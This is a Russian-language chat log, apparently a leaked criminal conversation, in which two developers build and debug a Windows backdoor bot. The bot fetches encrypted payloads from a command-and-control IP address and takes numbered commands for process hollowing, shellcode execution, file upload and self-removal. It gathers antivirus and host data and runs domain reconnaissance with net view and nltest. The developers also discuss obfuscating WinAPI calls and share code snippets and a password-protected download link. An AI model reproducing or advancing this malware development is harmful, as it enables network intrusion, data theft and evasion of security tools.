Timestamp	From	To	Message
2020-08-03 09:46:01.459326	price	mushroom	а где прикрепление производится?
2020-08-03 09:47:45.151781	mushroom	price	Сам прицепляешь. Получил url /path/1.exe например и прибавил его к адресу https://125.125.125.125:443 например https://125.125.125.125:443/path/1/exe
2020-08-03 09:49:32.528799	price	mushroom	вот смотри -сейчас запустил
2020-08-03 09:49:34.155988	price	mushroom	10 2 60 1 /57396fd3c3f052de4c8d0ceb1dfa32db/fs7Q08KetdMXFD7TaUi8QYVjFZk_wkVR6vRQwi6g a b c
2020-08-03 09:49:40.931760	price	mushroom	это что пришло
2020-08-03 09:50:09.864240	mushroom	price	a b c это что?
2020-08-03 09:50:23.150042	price	mushroom	параметры - командная линия
2020-08-03 09:50:41.128735	price	mushroom	задаются на сервере
2020-08-03 09:50:46.130269	mushroom	price	А без них попробуй.
2020-08-03 09:50:57.220981	mushroom	price	Может это глюк на сервере.
2020-08-03 09:51:03.954303	mushroom	price	Без них попробуй.
2020-08-03 09:51:14.061068	price	mushroom	пробую
2020-08-03 09:52:30.066047	price	mushroom	вот без них
2020-08-03 09:52:31.335785	price	mushroom	10 2 60 1 /57396fd3c3f052de4c8d0ceb1dfa32db/7p5d-k98pVdzeK5pWSP4FODtrxcI19ZqHmop2x-B
2020-08-03 09:52:53.204238	price	mushroom	и строка правда другая пришла
2020-08-03 09:52:56.584270	price	mushroom	но их нет
2020-08-03 09:53:25.187303	price	mushroom	почти другая, начало похоже
2020-08-03 09:53:56.949796	mushroom	price	Всё правильно.
2020-08-03 09:54:02.406951	mushroom	price	http://51.89.125.28:12232/57396fd3c3f052de4c8d0ceb1dfa32db/7p5d-k98pVdzeK5pWSP4FODtrxcI19ZqHmop2x-B
2020-08-03 09:54:19.154036	price	mushroom	понял
2020-08-03 09:54:27.132956	mushroom	price	Приплюсовал к адресу сделал запрос GET, получил файл.
2020-08-03 09:55:03.360288	price	mushroom	и зашифрованный к тому же
2020-08-03 09:55:09.245716	price	mushroom	здорово
2020-08-03 09:55:23.321843	mushroom	price	С командной строкой тоже правильно, там где a b c.
2020-08-03 09:56:30.345614	price	mushroom	а вот я например через bat канал запрашиваю systeminfo а мне на русские части ответа приходит абракадабра,это -игнорировать?
2020-08-03 09:56:47.081347	price	mushroom	или можно как-то chcp поставить?
2020-08-03 09:57:08.292177	price	mushroom	но не красиво с аброй
2020-08-03 09:58:14.140727	mushroom	price	Всё что шлёшь на сервер кодируй UTF-8.
2020-08-03 09:58:42.254916	price	mushroom	ещё пробовал по аналогии с  post /3  сделать post /4  но никакой реакции на сервере не увидел
2020-08-03 10:00:59.645529	mushroom	price	А я сейчас смог.
2020-08-03 10:01:12.365750	mushroom	price	Смотри c4ca4238a0b923820dcc509a6f75849b
2020-08-03 10:02:00.724812	price	mushroom	вот верил в тебя!
2020-08-03 10:02:14.517989	mushroom	price	2 раза OK.
2020-08-03 10:02:15.369166	price	mushroom	но говорил о себе
2020-08-03 10:02:23.233860	mushroom	price	Так же как и /3
2020-08-03 10:02:28.143796	mushroom	price	Делается.
2020-08-03 10:02:44.107906	price	mushroom	два раза в смысле подряд? "OKOK"?
2020-08-03 10:03:00.160276	price	mushroom	я и думал, что /4 это как /3
2020-08-03 10:03:10.958799	mushroom	price	Нет я два сообщения OK подряд послал для проверки.
2020-08-03 10:03:21.676181	price	mushroom	а если более длинный текст когда не ОК?
2020-08-03 10:03:36.641240	mushroom	price	Какой хочешь текст там можно слать.
2020-08-03 10:03:40.543317	price	mushroom	да -их два
2020-08-03 10:04:00.650277	mushroom	price	Закодировал в UTF-8, зашифровал и послал.
2020-08-03 10:04:04.171552	price	mushroom	ладно посмотрю ещё раз повнимательнее
2020-08-03 10:04:30.489668	mushroom	price	И закоммить в реппозиторий.
2020-08-03 10:04:41.107007	price	mushroom	хорошо
2020-08-03 10:30:36.928139	mushroom	price	Забыл сказать, processhelper один в один к себе в программу не вставляй, это как пример.
2020-08-03 10:31:17.927374	mushroom	price	strobfusactor и tdebug можно вставлять, это нужно будет потом.
2020-08-03 10:31:29.877295	price	mushroom	я так и спрашивал, я его в отдельный проект пытался вставить, но там замучишься пыль глотать
2020-08-03 10:31:43.944160	price	mushroom	поэтому перешел на созерцание
2020-08-03 10:32:13.490942	price	mushroom	смысла кода
2020-08-03 10:32:42.572431	mushroom	price	Он работает. Я тебе недостающие файлы дал.
2020-08-03 10:33:06.220655	price	mushroom	ок
2020-08-03 10:33:11.525626	mushroom	price	Или можно удалить или закомментировать debug_* и _STR, _WCS, _TSTR.
2020-08-03 10:34:07.875956	mushroom	price	И всякие там kernel32.createProcess например заменить на CreateProcess.
2020-08-03 10:34:23.295574	price	mushroom	я уже заменил, 144 замены
2020-08-03 10:34:34.707425	mushroom	price	Хотя сразу дам как пример обфускации вызовов WinApi.
2020-08-03 10:34:38.723164	price	mushroom	для одной только из функций
2020-08-03 10:36:35.484586	mushroom	price	Download: https://qaz.im/load/4i4rfa/Zkf77a   
Delete: https://qaz.im/index.php?a=delete&q=400243054
Пароль: _TE|p/w"SfG5Q}d<s
2020-08-03 10:37:42.923590	price	mushroom	принял
2020-08-03 15:03:26.370376	price	mushroom	Привет
2020-08-03 15:03:41.959341	price	mushroom	нашел почему у меня 4 команда не шла
2020-08-03 15:04:02.274732	price	mushroom	ну и тормознул (но не только на этом пустяке)
2020-08-03 15:04:34.308284	price	mushroom	оказывается возврат по 500 ошибке при передаче того что получается из кириллицы
2020-08-03 15:04:48.030287	price	mushroom	то есть английское посылается а русское нет
2020-08-03 15:06:11.308636	price	mushroom	в частности, я ещё и 12 команду отлаживаю и там по запросу dir вываливается русская диагностика и поэтому команда не доходит
2020-08-03 15:06:41.124629	mushroom	price	Кодируй в UTF-8 тогда дойдёт.
2020-08-03 15:06:44.264740	price	mushroom	если нейтральное чтото вызывать типа whoami (а у меня who английское) то всё доходит
2020-08-03 15:06:57.136501	price	mushroom	вот я и это делал
2020-08-03 15:07:13.698653	price	mushroom	у  меня 866 код (запросил выдала)
2020-08-03 15:07:49.147815	price	mushroom	там ошибка по памяти 0хс00005 замучила
2020-08-03 15:08:09.735123	price	mushroom	на преобразовании 1251 65001
2020-08-03 15:08:47.980557	price	mushroom	ладно понял спаибо
2020-08-03 15:09:00.317778	mushroom	price	Там надо сначала в юникод, потом из юникодв в utf-8
2020-08-03 15:09:08.024190	price	mushroom	я знаю
2020-08-03 15:09:41.615793	price	mushroom	вот когда преобразование делаю в мультибайт то и выскакивает ошибка оп памяти
2020-08-03 15:09:58.872610	price	mushroom	спасибо, путь указан
2020-08-03 15:10:03.059746	price	mushroom	я побежал
2020-08-03 15:11:09.956715	mushroom	price	Как пример:
_Success_(return != 0)
BOOL multiByteToUtf8(_In_ UINT codepage, _In_reads_bytes_(multiByteStrSize) PSTR multiByteStr,
    int multiByteStrSize, _Outptr_ PSTR * utf8Str, int* utf8StrSize)
{
    int cch = MultiByteToWideChar(codepage, 0, multiByteStr, multiByteStrSize, NULL, 0);
    PWSTR tmpStr = (PWSTR)HeapAlloc(GetProcessHeap(), 0, cch * sizeof(WCHAR));
    if (!tmpStr)
        return FALSE;

    cch = MultiByteToWideChar(codepage, 0, multiByteStr, multiByteStrSize, tmpStr, cch);

    int cb = WideCharToMultiByte(CP_UTF8, 0, tmpStr, cch, NULL, 0, NULL, NULL);
    PSTR result = (PSTR)HeapAlloc(GetProcessHeap(), 0, cb);
    if (!result)
    {
        HeapFree(GetProcessHeap(), 0, tmpStr);
        return FALSE;
    }

    cb = WideCharToMultiByte(CP_UTF8, 0, tmpStr, cch, result, cb, NULL, NULL);
    HeapFree(GetProcessHeap(), 0, tmpStr);

    *utf8Str = result;
    *utf8StrSize = cb;
    return TRUE;
}
2020-08-03 15:11:57.158372	price	mushroom	спасибо учту
2020-08-12 13:07:25.261036	mushroom	price	Когда свободен будешь напиши ка успехи, что сделано.
2020-08-12 13:46:44.551643	price	mushroom	хорошо
2020-08-12 13:47:40.788292	price	mushroom	сейчас всё стало ясно, но практически круглосуточно решаю проблемы со средой и условиями срабатывания той или иной функции
2020-08-12 13:48:26.458286	price	mushroom	поэтому есть много работы и мало вопросов, даже трекер нет времени заполнять, но сегодня задним числом все напишу
2020-08-12 13:49:42.115738	price	mushroom	а так, раз уж пишу, отработал бат/PS через пайп, нашел версию на антивирус(много мутоты поскольку параметр пропал при переходе на securitycenter2)
2020-08-12 13:50:23.208148	price	mushroom	ну и осталььное по общему устройству для отработки регламентов ТЗ (ошибки, времена выполнения и т.п.)
2020-08-12 13:51:19.151948	price	mushroom	не ясно сразу, зачем через файл выполнять скрипты если можно через пайп?
2020-08-12 13:57:11.031087	mushroom	price	Понятно. Через файл я думаю нужно если например какой нибудь сильно обфусцированный сценарий запустить, не факт что он через пайп пройдёт.
2020-08-12 13:57:38.902354	price	mushroom	понял
2020-08-12 13:57:42.096620	mushroom	price	Напиши проще какие команды сделаны на данный момент.
2020-08-12 13:59:01.037579	price	mushroom	кроме холовинга всё, практически
2020-08-12 13:59:33.503462	price	mushroom	сейчас всё причёсываю, чтобы было красиво
2020-08-12 14:00:06.328826	mushroom	price	0, 1, 10, 11, 12, 13, 14, 15, 16, 17, 100
2020-08-12 14:00:11.139698	mushroom	price	Так?
2020-08-12 14:00:50.605890	mushroom	price	Или в твоём ТЗ каких то из них нет?
2020-08-12 14:01:23.947308	mushroom	price	У нас ТЗ могут отличаться, у меня оно более старое.
2020-08-12 14:01:42.377537	price	mushroom	смотрю сейчас
2020-08-12 14:01:51.706786	mushroom	price	Короче какие у тебя в ТЗ команды есть и какие из них сделаны?
2020-08-12 14:02:02.586142	price	mushroom	ну 11 не пробовал, хотя всё ясно
2020-08-12 14:02:23.942354	price	mushroom	10 - холовинг не прообовал, а так ясно
2020-08-12 14:02:40.162145	price	mushroom	12, 13 полностью отладил
2020-08-12 14:03:34.055041	price	mushroom	14-ресет- всё понятно, как раз этим и занимаюсь (чтобы был доступ к длительно выполняемому процессу)
2020-08-12 14:03:49.244865	price	mushroom	15 - сделано
2020-08-12 14:04:08.031923	price	mushroom	16-загрузка понятно
2020-08-12 14:04:57.198707	price	mushroom	17-шелкод в хексе  придёт ведь, я его в бинар конвертирую и запущу (всё понятно)
2020-08-12 14:05:27.686079	price	mushroom	100 -удалиться из системы (ьбыл вопрос,  и непонятно что это)
2020-08-12 14:05:51.259134	mushroom	price	Шел код обязательно в SEH, а то вс> накроется из за того что шел код может быть криво написан.
2020-08-12 14:06:14.552647	price	mushroom	то есть прерывание перехватывать
2020-08-12 14:06:18.215255	mushroom	price	Удалиться из системы это удалить свой загрузчик.
2020-08-12 14:06:18.425460	price	mushroom	?
2020-08-12 14:06:41.920927	price	mushroom	запустить сторонний процесс и килл и делетефаайл?
2020-08-12 14:06:51.635388	mushroom	price	Да. Исключение родное для Windows. C++ их не перехватывают.
2020-08-12 14:07:02.292566	price	mushroom	и из расписания удалить?
2020-08-12 14:07:20.052851	price	mushroom	щл
2020-08-12 14:07:26.785293	price	mushroom	ок,записал
2020-08-12 14:07:27.141125	mushroom	price	По поводу 100, удалить свой загрузчик и завершиться.
2020-08-12 14:08:04.213802	mushroom	price	Загрузчик ты ещё не начал делать, команда 100 пока без загрузчика это просто завершиться.
2020-08-12 14:08:13.810243	price	mushroom	я про загрузчик пока не думал, читал что в ТЗ написано, но пока работаю в автономном режиме bd6
2020-08-12 14:08:44.590506	price	mushroom	ну тогда пишем что exit мы сделали
2020-08-12 14:09:43.025094	mushroom	price	Значит осталось hollowing для 10, reset для работающего процесса если у него есть таймаут, шелл код, загрузка файла. Так?
2020-08-12 14:09:45.917594	price	mushroom	если у тебя  bd2 а у меня bd6, значит уже более 6 версий есть этого бота?
2020-08-12 14:09:56.247180	price	mushroom	да
2020-08-12 14:10:02.199779	price	mushroom	а вот вопрос
2020-08-12 14:10:30.374394	price	mushroom	net view идет 50 сек а иаймаут 30, как поступать?
2020-08-12 14:10:36.941415	price	mushroom	таймаут
2020-08-12 14:10:55.499418	price	mushroom	да и вообще сбор по команде 1
2020-08-12 14:11:05.831523	mushroom	price	Для команды 1 нету таймаута.
2020-08-12 14:11:38.787390	mushroom	price	Это не таймаут а время через которое запросить новую команду, после завершения команды 1.
2020-08-12 14:12:05.461222	price	mushroom	понял
2020-08-12 14:12:21.394020	price	mushroom	ждатьзавершения процессов всех а потом ещё таймаут?
2020-08-12 14:14:02.904421	mushroom	price	Команда 1 получается блокирующая. Выполнил её полностью (в том числе необходимые процессы), отправил результат и ждёшь это время, которое в этой команде пришло, подождал, запрос новой команды.
2020-08-12 14:14:04.673693	price	mushroom	вот эта команда тоже в cmd.exe отрабатывает, а в createprocess не находит файла - ошибка 2
2020-08-12 14:14:25.844413	price	mushroom	понятно про команду 1
2020-08-12 14:14:58.476026	price	mushroom	я много времени потратил, когда антивирусы собирал с отключенным центром безопасности
2020-08-12 14:15:19.084095	price	mushroom	ну и с версией антивируса тоже были вопросы
2020-08-12 14:15:49.763850	price	mushroom	я через wmi их собираю
2020-08-12 14:16:36.971857	mushroom	price	вот эта команда тоже в cmd.exe отрабатывает, а в createprocess не находит файла - ошибка 2
2020-08-12 14:16:45.297903	price	mushroom	да
2020-08-12 14:16:46.075668	mushroom	price	Это про что?
2020-08-12 14:17:57.470439	price	mushroom	так было раньше, сейчас у меня другая версия исполнения bat/PS не проверял ещё, но реально все другие команды отрабатывали (не сервер поэтому писали что нет информации) а эта команда писала ошибка 2
2020-08-12 14:18:29.036135	price	mushroom	выяснится в свое время, конечно, просто из любопытства спросил
2020-08-12 14:18:37.158426	mushroom	price	net view /all /domain
2020-08-12 14:18:42.255639	mushroom	price	Эта команда?
2020-08-12 14:19:19.368231	price	mushroom	эти отрабатывали, говорили что не сервер, а не находилась команда trust=результат команды nltest /domain_trusts /all_trusts
2020-08-12 14:19:35.901999	mushroom	price	Её не нужно через что то запускать. Сразу CreateProcess net view /all /domain
2020-08-12 14:19:50.806107	mushroom	price	Так всё работает?
2020-08-12 14:19:51.657312	price	mushroom	а траст?
2020-08-12 14:20:12.385777	mushroom	price	Все что в команде 1 можно запускать сами по себе.
2020-08-12 14:20:12.759365	price	mushroom	так все работает, не находит среды, у меня просто виндуз
2020-08-12 14:20:40.306382	price	mushroom	понял попробую
2020-08-12 14:20:57.656725	mushroom	price	Я думаю потому что эти утилиты все в System32 лежат.
2020-08-12 14:21:07.036716	price	mushroom	я всё находил
2020-08-12 14:21:16.665347	price	mushroom	и полный путь подставлял
2020-08-12 14:21:29.165116	price	mushroom	проверял в простой ком.строке - отрабатывает
2020-08-12 14:21:37.300213	mushroom	price	Не нужно они системные. Как cmd например.
2020-08-12 14:21:55.158595	price	mushroom	в криэйтпроцесс - последняя ошибка 2 - нет файла
2020-08-12 14:22:09.918290	price	mushroom	попробую, спасибо
2020-08-12 14:22:33.973944	price	mushroom	вот ещё
2020-08-12 14:23:16.046254	price	mushroom	если в bat ставлю cmd.exe /c - не работает, без /c - работает!
2020-08-12 14:23:38.701217	mushroom	price	Надо cmd /c \"..\"
2020-08-12 14:23:41.780757	price	mushroom	в createprocess когда cmd  запускаю
2020-08-12 14:23:57.693347	mushroom	price	В кавычки брать команду для cmd.
2020-08-12 14:24:20.287610	mushroom	price	Там же пробелы есть.
2020-08-12 14:24:26.225608	price	mushroom	я же команду в пайп запихиваю
2020-08-12 14:24:45.512016	mushroom	price	А ты про команду 10.
2020-08-12 14:24:49.204300	price	mushroom	то есть cmd /c \". запихнул и допихнул \"
2020-08-12 14:25:08.023114	price	mushroom	нет - это команда 12
2020-08-12 14:25:27.208205	price	mushroom	хорошо,, направление есть проверю
2020-08-12 14:25:28.873900	mushroom	price	Если через пайп то просто cmd
2020-08-12 14:25:34.345172	price	mushroom	но и без /c работает
2020-08-12 14:25:39.616511	price	mushroom	вотвот
2020-08-12 14:25:51.938763	mushroom	price	Я и говорю что через пайп просто cmd
2020-08-12 14:26:07.723519	mushroom	price	А PowerShell -Command -
2020-08-12 14:26:17.416473	price	mushroom	это да ПС ннорм
2020-08-12 14:26:17.897051	mushroom	price	Если через пайп.
2020-08-12 14:26:44.720484	price	mushroom	букву С можно даже маленькой
2020-08-12 14:27:02.719651	price	mushroom	или просто с
2020-08-12 14:27:08.215625	price	mushroom	-с -
2020-08-12 14:27:25.521643	mushroom	price	Буду знать.
2020-08-12 14:27:56.794901	price	mushroom	внешний IP все сайты обходить (на случай что ктото выбыл)
2020-08-12 14:28:27.773175	price	mushroom	я вот тут беру http://checkip.dyndns.org
2020-08-12 14:28:32.282054	mushroom	price	Не надо. Не прокатило, пустое поле значит будет.
2020-08-12 14:28:53.051530	mushroom	price	Можешь парочку сделать, но не обязательно.
2020-08-12 14:29:12.387581	price	mushroom	там политика не чаще раз в 10 минут
2020-08-12 14:29:18.539500	mushroom	price	Если что не удалось получить пустое поле передавай тогда в ответе для команды 1.
2020-08-12 14:29:21.232517	price	mushroom	думал я
2020-08-12 14:29:53.587379	price	mushroom	а вотт про версию антивира - тоже можно пустое поле или добраться до инфы
2020-08-12 14:30:14.143383	mushroom	price	Пустое можно.
2020-08-12 14:30:17.499186	price	mushroom	сейчас только через определение программы запуска АВ и от него версию файла беру
2020-08-12 14:30:27.360649	mushroom	price	Главное чтобы они все были.
2020-08-12 14:30:38.813579	price	mushroom	раньше была такая информация теперь нет, но есть стартовый адрес
2020-08-12 14:30:39.519558	mushroom	price	Поля.
2020-08-12 14:30:49.314390	price	mushroom	поля понятно
2020-08-12 14:31:23.532199	price	mushroom	а вот например мне в выдаче сейчас аваст только выдает а дифендер куда то спрятался, как быть?
2020-08-12 14:31:53.919413	mushroom	price	Что выда>т то и посылай.
2020-08-12 14:31:56.998404	price	mushroom	это тоже эпопея была, у меня всё отключено было, видно такая продвинутая сборка
2020-08-12 14:32:14.777808	price	mushroom	а вдруг не допрашиваю как то
2020-08-12 14:32:31.739058	price	mushroom	а вот список процессов и установленных програм там до фига синонимов
2020-08-12 14:33:01.366613	price	mushroom	ну хоть бы с ПИД  были процессы а так scvhostили типа того
2020-08-12 14:33:10.503654	price	mushroom	я их неизбыточно посылаю
2020-08-12 14:33:32.076599	price	mushroom	и из 3 источников принимаю инфу
2020-08-12 14:33:50.594686	price	mushroom	из реестра и ещё из MSI
2020-08-12 14:34:16.283676	mushroom	price	И как не дублируется?
2020-08-12 14:34:37.773325	price	mushroom	бегу по списку найденных и не включаю в внего если уже включен
2020-08-12 14:34:55.497257	mushroom	price	А, так.
2020-08-12 14:35:03.166892	price	mushroom	а как ещё
2020-08-12 14:35:16.797748	mushroom	price	Как хочешь.
2020-08-12 14:35:18.793162	price	mushroom	и то 468 программ а так больше 1000
2020-08-12 14:36:33.432037	price	mushroom	короче я стремлюсь к финишу, ныряю обратно,  сегодня в трекер отпишу, к понедельнику уже выйду с последними вопросами(холовинг если возникнут, обфускация и тп)
2020-08-12 14:36:53.988980	mushroom	price	Не забудь загрузить в GitLab и в Redmine написать. Я потом посмотрю.
2020-08-12 14:36:56.102688	price	mushroom	но база уже готова и будет налажена окончательно
2020-08-12 14:37:06.132476	mushroom	price	OK.
2020-08-12 14:37:06.709657	price	mushroom	я  проо это и сказал
2020-08-12 14:37:36.527269	price	mushroom	я про это помню всегда, но реально либо в отладочном состоянии либо валюсь спать
2020-08-12 14:37:46.457680	price	mushroom	пока
2020-08-12 14:37:56.840010	mushroom	price	Пока.
2020-08-12 14:38:10.086177	price	mushroom	спасибо
2020-08-17 08:58:02.807856	mushroom	price	Привет. Напиши когда загрузишь на GitLab обновление для бота и можно будет смотреть.
2020-08-17 08:58:33.399440	price	mushroom	да хоть сейчас загружу и посмотришь, я отлаживаюсь
2020-08-17 08:58:53.338705	price	mushroom	минут через 10
2020-08-17 09:15:40.305459	price	mushroom	загрузил, смотри
2020-08-17 09:16:26.214719	price	mushroom	nltest  так и не заработал
2020-08-17 09:16:51.912709	price	mushroom	все остальные сетевые команды работают, а эту не находит
2020-08-17 09:20:39.519747	mushroom	price	А в командной строке работает?
2020-08-17 09:21:10.532240	price	mushroom	просто в строке и в powershelle работает
2020-08-17 09:21:38.568468	price	mushroom	когда из под createprocess запускаюю и там и тут не запускается, так же как и отдельным экзешником
2020-08-17 09:22:02.859100	price	mushroom	я и с полным путем запускал
2020-08-17 09:22:53.016799	price	mushroom	если проект соберется, то там можно раскомментировать сразу в начале старт пускателя (launcher) и в нем предустановлены уже все установки
2020-08-17 09:23:19.429136	price	mushroom	и можно выполнить лончер и посмотреть что возвращается в stdout
2020-08-17 09:46:23.073809	mushroom	price	Падает постоянно на команде 1.
2020-08-17 09:47:20.094185	mushroom	price	Вот здесь:
lstrcatA(SystemInfo, "&trust=");
//icommand = 10;cmdline = "c:\\windows\\system32\\nltest.exe /DOMAIN_TRUSTS"; 
icommand = 10; cmdline = "c:\\windows\\system32\\nltest.exe";
ipid = launcher(&netLists, icommand, URI, cmdline, iruntype, imaskprocess, itimeout); lstrcatA(SystemInfo, netLists); heapFree(netLists);
2020-08-17 09:47:25.187403	price	mushroom	минутку
2020-08-17 09:52:03.672797	price	mushroom	Launch last errorcode 2
2020-08-17 09:52:38.348971	price	mushroom	у меня сразу вылетает CreateProcess с кодом 2 - нет файла
2020-08-17 09:53:42.448123	price	mushroom		DWORD icommand = 10, iruntype = 1, imaskprocess = 0, itimeout = 30;
	CHAR* resultarea=0,*URI="", *cmdline="c:\\windows\\system32\\nltest.exe /domain_trusts /all_trusts";
	launcher(&resultarea, icommand, URI, cmdline, iruntype, imaskprocess, itimeout);
2020-08-17 09:53:51.873374	mushroom	price	А если cmdline = "nltest /domain_trusts /all_trusts"
2020-08-17 09:54:29.967599	price	mushroom	и ещё -туда же вбей net /view
2020-08-17 09:55:12.174333	price	mushroom	без полного пути-тоже код 2
2020-08-17 09:56:38.050808	mushroom	price	У меня в любом случае исключение. Хоть как не пиши.
2020-08-17 09:57:20.250913	mushroom	price	Hollowing не работает.
2020-08-17 09:58:29.998401	price	mushroom	это нет, я в другое всё время положил. Пробовал SEH.
2020-08-17 10:00:25.740513	price	mushroom	ещё я длл запускаю, но не получаю с сервера, локально отлаживал
2020-08-17 10:01:05.302893	price	mushroom	сейчас соеди посылку с путем с сервера, сохранение с рандомным именем и запускню
2020-08-17 10:01:31.139201	price	mushroom	Системная ошибка 6118.
Недоступен список серверов для этой рабочей группы.
2020-08-17 10:01:46.066989	price	mushroom	* cmdline = "net view /all";
	launcher(&resultarea, icommand, URI, cmdline, iruntype, imaskprocess, itimeout);
2020-08-17 10:02:25.264159	price	mushroom	вот это работает, а то сразу из CreateProcess свинчивается на выход с последним кодом 2
2020-08-17 10:03:04.288903	mushroom	price	У меня тоже код 2. Хотя в моём боте работает nltest.
2020-08-17 10:03:15.348951	mushroom	price	Где то у тебя ошибка.
2020-08-17 10:03:22.690345	price	mushroom	именно это меня и возмущает
2020-08-17 10:03:26.486853	price	mushroom	да
2020-08-17 10:03:47.267016	price	mushroom	но в чем? - это же голый api
2020-08-17 10:04:24.355693	price	mushroom	во -точно, сейчас соберу проект только из createprocess
2020-08-17 10:04:56.401057	price	mushroom	f ns ujdjhbk? xnj dbcytn-'nj rfr& ghjljk;ftncz &
2020-08-17 10:05:13.526085	price	mushroom	а ты говорил что виснет, - это как - продолжается?
2020-08-17 10:05:47.184375	mushroom	price	Что виснет?
2020-08-17 10:06:14.023150	price	mushroom	[12:46:22] <mushroom> Падает постоянно на команде 1.
2020-08-17 10:07:03.980414	price	mushroom	я это понял, что виснет, вылетает , плохо вобщем
2020-08-17 10:07:11.778242	mushroom	price	Не виснет, там где то NULL указатель и программа падает.
2020-08-17 10:07:49.652958	price	mushroom	дит?
2020-08-17 10:08:20.570322	price	mushroom	просто запускается и падает или с сервера команда приходит?
2020-08-17 10:08:46.433140	mushroom	price	ipid = launcher(&netLists, icommand, URI, cmdline, iruntype, imaskprocess, itimeout); lstrcatA(SystemInfo, netLists); heapFree(netLists);
2020-08-17 10:08:52.500263	mushroom	price	На этой строчке.
2020-08-17 10:09:58.686844	price	mushroom	вообще это просто так строка стоит,  если перед DoInternet(), для иллюстрации nltest
2020-08-17 10:10:25.741333	price	mushroom	нет, понял
2020-08-17 10:10:50.854086	price	mushroom	это другое место - это запрос сетевых команд в getsysteminfo
2020-08-17 10:15:29.996990	price	mushroom	вот здесь поставил - 	resultarea = GetSystemInfo();
	                    DoInternet();             отработало, но твой случай перебивает мой, я в другие машины не выходил ещё
2020-08-17 10:17:16.193861	mushroom	price	Серьезность	Код	Описание	Проект	Файл	Строка	Состояние подавления
Ошибка	LNK2019	ссылка на неразрешенный внешний символ _memset в функции "int __cdecl launcher(char * *,unsigned long,char *,char *,unsigned long,unsigned long,unsigned long)" (?launcher@@YAHPAPADKPAD1KKK@Z).	bd6	C:\Users\ivana\Projects\others\bd6\backdoor\launcher.obj	1
2020-08-17 10:17:26.550279	mushroom	price	Не собирается.
2020-08-17 10:17:54.376747	price	mushroom	ты же запускал!
2020-08-17 10:18:06.652591	price	mushroom	чтото добавил?
2020-08-17 10:18:15.006351	mushroom	price	Да. Теперь не собирается.
2020-08-17 10:18:27.131762	price	mushroom	там без CRT
2020-08-17 10:18:50.897824	price	mushroom	вместо memset надо писать lmemset
2020-08-17 10:19:16.508126	mushroom	price	Я нигде не писал memset.
2020-08-17 10:19:26.318229	mushroom	price	Это твой _memset
2020-08-17 10:19:53.443499	mushroom	price	Я его в проекте не могу найти.
2020-08-17 10:20:19.071363	price	mushroom	там ни одного нет, они не находят линковки
2020-08-17 10:20:47.853799	price	mushroom	это как раз в launcher
2020-08-17 10:20:52.688647	price	mushroom	пишет
2020-08-17 10:21:27.446719	mushroom	price	Ты x64 пробовал запускать версию.
2020-08-17 10:21:34.859584	price	mushroom	нет
2020-08-17 10:21:50.318849	price	mushroom	только х86 дебаг
2020-08-17 10:21:54.078990	mushroom	price	В настройках проекта только Win32 вижу.
2020-08-17 10:22:03.612493	mushroom	price	А я запускаю x64 Debug
2020-08-17 10:22:07.475059	price	mushroom	там только это и есть
2020-08-17 10:22:25.831654	price	mushroom	перейди на вин32, 64 сделаю
2020-08-17 10:23:01.777231	mushroom	price	Сделай чтобы x64 было тоже, 99 процентов это x64 Win 10, мы сейчас x86 вообще в работе не используем.
2020-08-17 10:23:19.714621	price	mushroom	конечно, сделаю
2020-08-17 10:23:48.907116	mushroom	price	Вот у меня и падает и _memset не находится.
2020-08-17 10:23:57.064186	mushroom	price	Сделаешь напишешь тогда.
2020-08-17 10:24:02.818378	price	mushroom	хорошо
2020-08-17 10:24:16.835099	price	mushroom	сейчас погенерю
2020-08-17 10:28:03.225046	mushroom	price	У тебя в Release указан флаг /MTd
2020-08-17 10:28:12.724944	mushroom	price	А должен быть /MT
2020-08-17 10:28:13.321624	price	mushroom	да
2020-08-17 10:28:26.201529	price	mushroom	4 модуля на выходе
2020-08-17 10:28:35.285985	price	mushroom	с дебагом и без 64 и 86
2020-08-17 10:28:43.827936	price	mushroom	я так понял тз
2020-08-17 10:29:01.271404	mushroom	price	Дебаг это Debug
2020-08-17 10:29:20.473536	mushroom	price	Всё остальное это Release с /MT
2020-08-17 10:29:52.801549	mushroom	price	Там должно быть Debug, Release с логами, Release_nologs без логов.
2020-08-17 10:30:21.485612	price	mushroom	а логи-это что7
2020-08-17 10:30:47.485276	mushroom	price	То что ты в консоль пишешь для отладки.
2020-08-17 10:30:58.892115	price	mushroom	ну да
2020-08-17 10:31:14.959341	mushroom	price	Ещё нужно это же в файл писать.
2020-08-17 10:31:28.348478	price	mushroom	Multi-threaded Debug (/MTd)
2020-08-17 10:31:31.850725	mushroom	price	Чтобы тестер тебе логи давал когда ошибки найдёт.
2020-08-17 10:32:08.920483	price	mushroom	может и написано в релизе что-то, но я только дебаг х86 писал
